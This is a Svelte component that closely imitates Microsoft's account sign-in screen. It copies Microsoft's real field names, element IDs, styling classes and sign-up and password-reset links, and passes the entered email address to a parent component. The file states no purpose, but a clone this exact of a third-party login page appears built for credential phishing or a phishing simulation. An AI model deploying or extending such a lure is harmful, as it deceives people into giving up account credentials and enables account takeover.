<script>
  import { createEventDispatcher } from "svelte";
  const dispatch = createEventDispatcher();
  var login;

  function onLoginNext() {
    dispatch("next", { login });
  }

  function handleKeyup() {
    if (event.code == "Enter") {
      event.preventDefault();
      onLoginNext();
    }
  }
</script>

<div role="main">
  <div>
    <div class="pagination-view animate slide-in-next">
      <div>
        <div>
          <div class="row title ext-title" id="loginHeader">
            <div role="heading" aria-level="1">Sign in</div>
          </div>
        </div>
        <div class="row">
          <div role="alert" aria-live="assertive" />
          <div class="form-group col-md-24">
            <div class="placeholderContainer">

              <input
                type="email"
                name="loginfmt"
                id="i0116"
                maxlength="113"
                class="form-control ltr_override input ext-input text-box
                ext-text-box"
                aria-required="true"
                bind:value={login}
                on:keyup|preventDefault={handleKeyup}
                placeholder="Email, phone, or Skype" />

            </div>
          </div>
        </div>
        <div class="position-buttons">
          <div class="row">
            <div class="col-md-24">
              <div class="text-13">
                <div class="form-group">
                  No account?
                  <a
                    href="https://signup.live.com/signup"
                    id="signup"
                    aria-label="Create a Microsoft account">
                    Create one!
                  </a>
                </div>
                <div class="form-group">
                  <a
                    id="cantAccessAccount"
                    name="cannotAccessAccount"
                    href={'https://passwordreset.microsoftonline.com/?username=' + login}>
                    Can’t access your account?
                  </a>
                </div>
                <div class="form-group">
                  <div class="form-group">
                    <a id="idA_PWD_SwitchToCredPicker" href="/" target="_blank">
                      Sign-in options
                    </a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="win-button-pin-bottom">
          <div class="row">
            <div>
              <div class="col-xs-24 no-padding-left-right button-container">
                <div class="inline-block">
                  <button
                    type="button"
                    id="idSIButton9"
                    on:click={onLoginNext}
                    class="button ext-button primary ext-primary">
                    Next
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>
